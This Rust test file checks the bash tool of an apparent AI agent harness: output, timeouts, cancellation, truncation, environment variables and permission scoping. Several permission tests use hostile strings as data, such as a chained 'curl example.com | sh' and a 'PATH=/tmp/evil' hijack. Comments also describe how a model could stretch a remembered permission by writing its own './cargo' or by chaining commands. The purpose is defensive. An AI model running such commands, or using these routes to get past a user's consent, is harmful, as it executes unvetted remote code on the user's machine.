//! What a command comes back as, and what stops one.

use std::thread;
use std::time::{Duration, Instant};

use super::output::{OUTPUT, cut};
use super::{Bash, Cancel, Sensitivity, Tool, ToolArgs, ToolError, ToolOutput, program};
use crate::sample::{Sample, call, permitted};

/// The sensitivity a granted `bash` call carries.
fn running(command: &str) -> Sensitivity {
    Sensitivity::SpawnsProcess {
        program: program(command).into(),
    }
}

fn bash(sample: &Sample, args: &str) -> Result<ToolOutput, ToolError> {
    Bash::new(sample.workspace(), Cancel::new()).run(call(args), permitted(&running("sh")))
}

fn ran(sample: &Sample, args: &str) -> ToolOutput {
    bash(sample, args).expect("the command ran")
}

#[test]
fn output_and_a_zero_exit_come_back_as_the_result() {
    let sample = Sample::new("bash-ok");

    let output = ran(&sample, r#"{"command":"echo hello"}"#);

    assert!(!output.is_failed());
    assert_eq!(output.text(), "hello");
}

#[test]
fn a_non_zero_exit_is_a_result_the_model_can_act_on() {
    // A failing test run is exactly what the model asked for. Ending the turn
    // over it would keep the failure from the one thing that can fix it.
    let sample = Sample::new("bash-exit");

    let output = ran(&sample, r#"{"command":"echo broken; exit 3"}"#);

    assert!(output.is_failed());
    assert_eq!(output.text(), "broken\n\n[exit status 3]");
}

#[test]
fn diagnostics_arrive_next_to_the_output_they_explain() {
    let sample = Sample::new("bash-stderr");

    let output = ran(&sample, r#"{"command":"echo out; echo trouble 1>&2"}"#);

    assert!(output.text().contains("out"), "{}", output.text());
    assert!(output.text().contains("trouble"), "{}", output.text());
}

#[test]
fn a_command_with_nothing_to_say_says_so() {
    // An empty result and a result the model failed to read look the same
    // otherwise.
    let sample = Sample::new("bash-quiet");

    assert_eq!(ran(&sample, r#"{"command":"true"}"#).text(), "(no output)");
}

#[test]
fn the_command_runs_in_the_workspace_root() {
    let sample = Sample::new("bash-cwd");
    sample.write("marker.txt", "found me\n");

    assert_eq!(
        ran(&sample, r#"{"command":"cat marker.txt"}"#).text(),
        "found me"
    );
}

#[test]
fn a_command_that_runs_too_long_is_stopped() {
    let sample = Sample::new("bash-timeout");

    let started = Instant::now();
    let output = ran(&sample, r#"{"command":"sleep 30","timeout":1}"#);

    assert!(output.is_failed());
    assert!(output.text().contains("ran too long"), "{}", output.text());
    assert!(
        started.elapsed() < Duration::from_secs(10),
        "it waited out the sleep"
    );
}

#[test]
fn a_command_stopped_for_running_too_long_says_so_once() {
    // Both facts hold here: the command was killed for taking too long, and the
    // thing it left running still holds the pipe open. Reported as two notes
    // they read as two separate problems, and the second one names a cause that
    // is not why this stopped.
    let sample = Sample::new("bash-timeout-background");

    let output = ran(
        &sample,
        r#"{"command":"(sleep 30 &) ; sleep 30","timeout":1}"#,
    );

    assert!(output.is_failed());
    assert!(output.text().contains("ran too long"), "{}", output.text());
    assert_eq!(
        output.text().matches("\n\n[").count(),
        1,
        "one marker, not two: {}",
        output.text()
    );
}

#[test]
fn a_command_that_leaves_something_running_still_comes_back() {
    // Starting a server in the background is a thing a model does, and the
    // thing it starts inherits the pipe. Waiting for the end of the output
    // would then wait for a process nothing is going to stop.
    let sample = Sample::new("bash-background");

    let started = Instant::now();
    let output = ran(&sample, r#"{"command":"(sleep 30 &) ; echo started"}"#);

    assert!(output.text().contains("started"), "{}", output.text());
    assert!(
        started.elapsed() < Duration::from_secs(10),
        "it waited for the background process"
    );
}

#[test]
fn output_that_was_still_arriving_does_not_come_back_looking_complete() {
    // The read gives up after a bounded wait, so what came back is a prefix of
    // the output rather than the whole of it. Unmarked, that is the truncation
    // problem in another place: the model reads a partial result as the
    // complete one and concludes the command printed nothing more.
    let sample = Sample::new("bash-arriving");

    let output = ran(&sample, r#"{"command":"(sleep 30 &) ; echo started"}"#);

    assert!(output.text().contains("started"), "{}", output.text());
    assert!(
        output.text().contains("still arriving"),
        "{}",
        output.text()
    );
}

#[test]
fn a_timeout_past_the_ceiling_is_refused_rather_than_quietly_shortened() {
    let sample = Sample::new("bash-ceiling");

    let output = ran(&sample, r#"{"command":"true","timeout":9000}"#);

    assert!(output.is_failed());
    assert_eq!(output.text(), "timeout must be 600 seconds or less");
}

#[test]
fn a_turn_the_user_stopped_ends_the_command_with_it() {
    // A child is not one of this program's threads: nothing in it watches the
    // flag, so what this pins is that something else does.
    let sample = Sample::new("bash-cancel");
    let cancel = Cancel::new();

    let stopper = cancel.clone();
    thread::spawn(move || {
        thread::sleep(Duration::from_millis(100));
        stopper.request();
    });

    let started = Instant::now();
    let problem = Bash::new(sample.workspace(), cancel)
        .run(
            call(r#"{"command":"sleep 30"}"#),
            permitted(&running("sleep")),
        )
        .expect_err("the turn was stopped");

    assert!(matches!(problem, ToolError::Cancelled("bash")));
    assert!(
        started.elapsed() < Duration::from_secs(10),
        "it waited out the sleep"
    );
}

#[test]
fn a_turn_already_stopped_never_starts_the_command() {
    let sample = Sample::new("bash-cancelled");
    let cancel = Cancel::new();
    cancel.request();

    let problem = Bash::new(sample.workspace(), cancel)
        .run(
            call(r#"{"command":"touch should-not-exist"}"#),
            permitted(&running("touch")),
        )
        .expect_err("the turn was stopped");

    assert!(matches!(problem, ToolError::Cancelled("bash")));
    assert!(!sample.root().join("should-not-exist").exists());
}

#[test]
fn a_call_with_no_command_says_what_is_missing() {
    let sample = Sample::new("bash-nocommand");

    let problem = bash(&sample, "{}").expect_err("nothing to run");

    assert_eq!(problem.to_string(), "bash: command is required");
}

#[test]
fn more_output_than_anything_can_use_keeps_both_ends() {
    let text = format!("{}{}", "start", "x".repeat(OUTPUT * 2));
    let short = cut(&text);

    assert!(short.starts_with("start"), "the beginning went");
    assert!(short.ends_with('x'));
    assert!(short.len() < text.len());
    assert!(short.contains("cut from the middle"), "{short}");
}

#[test]
fn a_cut_never_lands_inside_a_character() {
    // Multi-byte characters at an offset that puts the halfway mark inside one:
    // slicing there would yield nothing at all rather than a shorter head.
    let text = format!("a{}", "€".repeat(OUTPUT));
    let short = cut(&text);

    assert!(short.starts_with('a'), "the head was dropped whole");
    assert!(short.ends_with('€'));
    assert!(short.len() < text.len());
}

#[test]
fn output_that_fits_comes_back_untouched() {
    assert_eq!(cut("small enough\n"), "small enough");
}

#[test]
fn the_question_names_the_program_as_the_command_wrote_it() {
    assert_eq!(program("cargo test"), "cargo");
    assert_eq!(program("  cargo test  "), "cargo");
}

#[test]
fn a_path_is_a_different_program_from_a_bare_name() {
    // Collapsing these to `cargo` would let one remembered `always` run any
    // file of that name: the model can write `./cargo` itself and then ask for
    // it, and a scope that could not tell them apart would not ask again.
    assert_ne!(program("./cargo test"), program("cargo test"));
    assert_eq!(program("/usr/bin/cargo test"), "/usr/bin/cargo");
    assert_eq!(program("./cargo test"), "./cargo");
}

#[test]
fn a_leading_assignment_makes_the_whole_command_the_scope() {
    // The assignment decides which binary the next word resolves to, so that
    // word alone no longer says what will run.
    assert_eq!(
        program("PATH=/tmp/evil cargo test"),
        "PATH=/tmp/evil cargo test"
    );
    assert_eq!(
        program("  RUST_LOG=debug cargo test  "),
        "RUST_LOG=debug cargo test"
    );
}

#[test]
fn a_word_the_shell_would_not_split_is_reported_whole() {
    // `sh` splits on space, tab and newline. Every other whitespace character
    // is an ordinary character to it and stays part of the word, so naming the
    // text before one would name a program that is not the one that runs —
    // `./build` when `./build\u{a0}x` is what the shell resolves and executes.
    assert_eq!(program("./build\u{a0}x"), "./build\u{a0}x");
    assert_eq!(program("cargo\u{2028}test"), "cargo\u{2028}test");
    assert_eq!(program("ls\u{b}rm"), "ls\u{b}rm");

    // A tab is a separator to the shell, so it names a program like a space.
    assert_eq!(program("cargo\ttest"), "cargo");
}

#[test]
fn a_command_that_chains_is_reported_whole() {
    // Remembering `cargo` from `cargo test` would otherwise also allow
    // `cargo test; curl example.com | sh` for the rest of the session.
    assert_eq!(
        program("cargo test; curl example.com | sh"),
        "cargo test; curl example.com | sh"
    );
    assert_eq!(program("ls > out.txt"), "ls > out.txt");
    assert_eq!(program("echo $(whoami)"), "echo $(whoami)");
}

#[test]
fn the_sensitivity_carries_the_program_the_call_asked_for() {
    // The path as written, not its last component: what the user is consenting
    // to is the file that will run, and two files can share a name.
    let sample = Sample::new("bash-sensitivity");
    let tool = Bash::new(sample.workspace(), Cancel::new());

    assert_eq!(
        tool.sensitivity(&ToolArgs::new(r#"{"command":"/usr/bin/git status"}"#)),
        Sensitivity::SpawnsProcess {
            program: "/usr/bin/git".into()
        }
    );
}

#[test]
fn a_call_too_malformed_to_read_reports_the_whole_of_what_was_sent() {
    // `run` will refuse it, but a sensitivity is needed first, and the safe
    // answer to "what will this run" when the answer is unknown is everything.
    let sample = Sample::new("bash-malformed");
    let tool = Bash::new(sample.workspace(), Cancel::new());

    assert_eq!(
        tool.sensitivity(&ToolArgs::new("not json at all")),
        Sensitivity::SpawnsProcess {
            program: "not json at all".into()
        }
    );
}

#[test]
fn the_variables_the_tool_was_given_reach_the_command() {
    // crucible cannot put these in its own environment — writing to it is
    // `unsafe` in edition 2024 and this workspace forbids that — so they are
    // handed to each child directly. Which is the better answer anyway: the
    // model's commands get them and nothing else on the machine does.
    let sample = Sample::new("bash-env");

    let output = Bash::new(sample.workspace(), Cancel::new())
        .exporting([("CRUCIBLE_TEST_PAGER", "cat")])
        .run(
            call(r#"{"command":"echo $CRUCIBLE_TEST_PAGER"}"#),
            permitted(&running("sh")),
        )
        .expect("the command ran");

    assert_eq!(output.text(), "cat");
}

#[test]
fn a_variable_the_tool_was_given_wins_over_the_one_crucible_was_started_with() {
    // The file is the nearer answer: somebody who wrote `PATH` or `RUST_LOG`
    // into their configuration meant it for the commands crucible runs, and
    // inheriting the shell's copy instead would leave it doing nothing.
    let sample = Sample::new("bash-env-over");

    let output = Bash::new(sample.workspace(), Cancel::new())
        .exporting([("HOME", "/nowhere-in-particular")])
        .run(
            call(r#"{"command":"echo $HOME"}"#),
            permitted(&running("sh")),
        )
        .expect("the command ran");

    assert_eq!(output.text(), "/nowhere-in-particular");
}
